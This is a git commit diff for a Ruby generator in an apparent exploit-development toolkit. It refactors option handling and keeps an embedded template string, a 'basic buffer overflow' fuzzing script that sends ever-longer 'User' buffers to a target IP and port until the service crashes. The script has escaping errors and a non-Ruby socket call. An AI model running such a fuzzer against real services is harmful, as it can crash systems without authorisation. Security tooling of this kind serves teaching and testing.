d9f05f9eb4b14d293d7c8cdf5c61bfb68cd3d11f
phantomfreeJr <vdavis@siu.edu>
2017-08-03 14:58:33 -0500

    revert gen tool back to original

--- lib/reaper/tools/generate.rb
+++ lib/reaper/tools/generate.rb
@@ -3,8 +3,8 @@ require 'optparse'
 module Generate
   class Content
     protected
-      def get_remote_content
-        "# Basic buffer overflow Example\nrequire 'socket'\n\n# Get Argument Target IP and Port\ntarget = ARGF.argv[0]\nport = ARGF.argv[1]\n\n# Compact IP/Port\nsocket_addr = Socket.pack_sockaddr_in(port, target)\n\n# Simple buffer of A's\nbuff = 'x41'*50\n\nwhile true\n\tbegin\n\t\t# Create new socket to connect C style\n\t\ts = Socket.new(:INET, :STREAM, 0)\n\t\ts.settimeout(2)\n\n\t\t#connect\n\t\ts.connect(socket_addr)\n\t\ts.recv(1024)\n\t\tputs "+'"Sending buffer with length #{buff.length.to_s}"'+"\n\t\ts.send("+'"User #{buff}rn"'+")\n\t\ts.close()\n\t\tsleep(1)\n\n\t\tbuff = buff + 'x41'*50\n\trescue\n\t\tputs "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"\n\t\texit\n\tend\nend"
+      def self.get_remote_content
+        "# Basic buffer overflow Example\nrequire 'socket'\n\n# Get Argument Target IP and Port\ntarget = ARGF.argv[0]\nport = ARGF.argv[1]\n\n# Compact IP/Port\nsocket_addr = Socket.pack_sockaddr_in(port, target)\n\n# Simple buffer of A's\nbuff = 'x41'*50\n\nwhile true\n\tbegin\n\t\t# Create new socket to connect C style\n\t\ts = Socket.new(:INET, :STREAM, 0)\n\t\ts.settimeout(2)\n\n\t\t#connect\n\t\ts.connect(socket_addr)\n\t\ts.recv(1024)\n\t\tputs "+'"Sending buffer with length #{buff.length.to_s}"'+"\n\t\ts.send("+'"User #{buff}rn", 0'+")\n\t\ts.close()\n\t\tsleep(1)\n\n\t\tbuff = buff + 'x41'*50\n\trescue\n\t\tputs "+'"[+] Crash occured with buffer length #{(buff.length - 50).to_s}"'+"\n\t\texit\n\tend\nend"
       end
 
       def get_payload_content
@@ -13,19 +13,6 @@ module Generate
   end
 
   class Options < Content
-    attr_accessor :string
-
-    def initialize
-      @string = ""
-    end
-
-    def set_string(string)
-      @string = string
-    end
-
-    def self.get_string
-      @string
-    end
 
     def self.parse(args)
       options = {}
@@ -36,12 +23,13 @@ module Generate
         opt.on('-r', '--remote-exploit <filename>', String, "Generate a remote exploit file") do |file|
           options[:filename] = file
           # Return String from get_remote_content
-          set_string(get_remote_content)
+          self.set_string(self.get_remote_content)
         end
 
         opt.on('-p', '--payload <filename>', String, "Generate a payload file") do |file|
           options[:filename] = file
-          set_string(get_payload_content)
+          # Return String from get_payload_content
+          self.set_string(self.get_payload_content)
         end
 
         opt.on_tail('-h', '--help', 'Show this message') do
@@ -55,13 +43,20 @@ module Generate
       raise OptionParser::MissingArgument, 'No options set, try -h for usage' if options.empty?
       options
     end
+
+    def self.set_string(string)
+      @string = string
+    end
+
+    def self.get_string
+      @string
+    end
   end
 
   class Driver
     def initialize
       begin
         @opts = Options.parse(ARGV)
-        @string = Options.new
       rescue OptionParser::ParseError => e
         $stderr.puts "[x] #{e.message}"
         exit
@@ -69,7 +64,7 @@ module Generate
     end
 
     def run
-      File.open("#{@opts[:filename]}.rb", "w+") {|f| f.write(@string.get_string) }
+      File.open("#{@opts[:filename]}.rb", "w+") {|f| f.write(Options.get_string) }
     end
   end
 end
